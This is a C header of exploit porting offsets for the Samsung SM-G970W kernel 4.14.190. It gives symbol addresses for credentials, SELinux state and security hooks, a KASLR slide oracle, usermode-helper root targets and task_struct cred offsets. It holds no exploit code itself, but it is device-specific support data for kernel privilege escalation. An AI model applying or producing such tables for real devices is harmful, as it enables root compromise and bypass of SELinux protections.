/* beyond0q_4.14.h - Samsung SM-G970W (beyond0qltecs) / SD855 / Linux 4.14.190
 * Generated from: G9700+G970W OSRC source + device /proc/config.gz build,
 *                 verified kallsyms (linux_banner anchor), and disasm of the
 *                 shipped Image.  VA_BITS=39.  KASLR base leaked at runtime. */

#ifndef BEYOND0Q_414_H
#define BEYOND0Q_414_H

/* ---- address space ---- */
#define KIMAGE_TEXT_BASE   0xffffff8008000000ULL   /* == _text VA (link base) */
#define P0_PAGE_OFFSET     0xffffff8000000000ULL
#define P0_PHYS_OFFSET     0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x0ULL                 /* TODO: SD855 kernel_phys_load (measure) */
#define DIRECT_MAP_BASE    0xffffff8000000000ULL
#define DIRECT_MAP_END     0xffffff9000000000ULL
#define VMEMMAP_START      0xfffffffe00000000ULL

/* ---- global symbol offsets (sym - KIMAGE_TEXT_BASE) ---- */
#define INIT_TASK_OFF            0x029A9780ULL
#define INIT_CRED_OFF            0x0220E0D0ULL
#define INIT_UTS_NS_OFF          0x029A9558ULL
#define EMPTY_ZERO_PAGE_OFF      0x0220B000ULL
#define ROOT_TASK_GROUP_OFF      0x02CE9E80ULL
#define SELINUX_ENFORCING_OFF    0x02DC8CC8ULL   /* selinux_state */
#define KPTR_RESTRICT_OFF        0x029A92A8ULL
#define SECURITY_HOOK_HEADS_OFF  0x021F7CA0ULL
#define KMALLOC_CACHES_OFF       0x021F7798ULL
#define ANON_PIPE_BUF_OPS_OFF    0x017A1600ULL
#define CAP_CAPABLE_ACTIVE_OFF   0x00411DCCULL   /* cap_capable */
#define SELINUX_BLOB_SIZES_OFF   0x0ULL          /* n/a on 4.14 */

/* ---- ashmem ---- */
#define ASHMEM_FOPS_OFF          0x019CCA30ULL
#define ASHMEM_MISC_FOPS_OFF     0x02BB1750ULL   /* ashmem_misc */
#define ASHMEM_IOCTL_OFF         0x01043F9CULL
#define ASHMEM_COMPAT_IOCTL_OFF  0x010447F4ULL
#define ASHMEM_MMAP_OFF          0x0104484CULL
#define ASHMEM_OPEN_OFF          0x010449BCULL
#define ASHMEM_RELEASE_OFF       0x01044A3CULL
#define ASHMEM_READ_ITER_OFF     0x01043EDCULL
#define ASHMEM_SHOW_FDINFO_OFF   0x0ULL

/* ---- configfs / splice (4.14 names) ---- */
#define CONFIGFS_READ_ITER_OFF      0x002BE7DCULL  /* configfs_read_bin_file */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x002BE96CULL  /* configfs_write_bin_file */
#define COPY_SPLICE_READ_OFF        0x0024F2D4ULL  /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF             0x0020B474ULL

/* ---- KASLR slide oracle ---- */
#define SLIDE_NFULNL_LOGGER_OFF       0x0299F4C0ULL  /* nfulnl_logger */
#define SLIDE_LOGGERS_0_1_OFF         0x0299F3F0ULL  /* loggers + 0x10 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02E86268ULL  /* sysctl_bootid */
#define SLIDE_SYSCTL_BOOTID_OFF       0x02E86268ULL

/* ---- UMH root (workqueue) ---- */
#define SYSTEM_UNBOUND_WQ_OFF               0x02999F88ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x0004FCDCULL

/* ---- struct task_struct field offsets (4.14) ---- */
#define TASK_PID_OFF             0x6A8
#define TASK_TGID_OFF            0x6AC
#define TASK_COMM_OFF            0x858
#define TASK_CRED_OFF            0x850
#define TASK_REAL_CRED_OFF       0x848
#define TASK_TASKS_OFF           0x5A8
#define TASK_PRIO_OFF            0x0A8
#define TASK_NORMAL_PRIO_OFF     0x0B0
#define TASK_SCHED_TASK_GROUP_OFF 0x400
#define TASK_PI_LOCK_OFF         0x91C
#define TASK_PI_WAITERS_OFF      0x928
#define TASK_PI_TOP_TASK_OFF     0x938
#define TASK_PI_BLOCKED_ON_OFF   0x940
#define TASK_MM_OFF              0x5F8
#define TASK_REAL_PARENT_OFF     0x6B0
#define TASK_ATOMIC_FLAGS_OFF    0x670
#define TASK_SECCOMP_OFF         0x8F8
#define TASK_THREAD_OFF          0xB70
#define SIZEOF_TASK_STRUCT       0xF80

/* ---- struct mm_struct ---- */
#define MM_OWNER_OFF             0x328

/* ---- struct file_operations field offsets (4.14: no iterate_shared) ---- */
#define FOPS_LLSEEK_OFF          0x08
#define FOPS_READ_OFF            0x10
#define FOPS_WRITE_OFF           0x18
#define FOPS_READ_ITER_OFF       0x20
#define FOPS_WRITE_ITER_OFF      0x28
#define FOPS_IOCTL_OFF           0x48   /* unlocked_ioctl */
#define FOPS_COMPAT_IOCTL_OFF    0x50
#define FOPS_MMAP_OFF            0x58
#define FOPS_OPEN_OFF            0x60
#define FOPS_RELEASE_OFF         0x70
#define FOPS_SPLICE_READ_OFF     0xB8
#define FOPS_SHOW_FDINFO_OFF     0xD0

#endif /* BEYOND0Q_414_H */
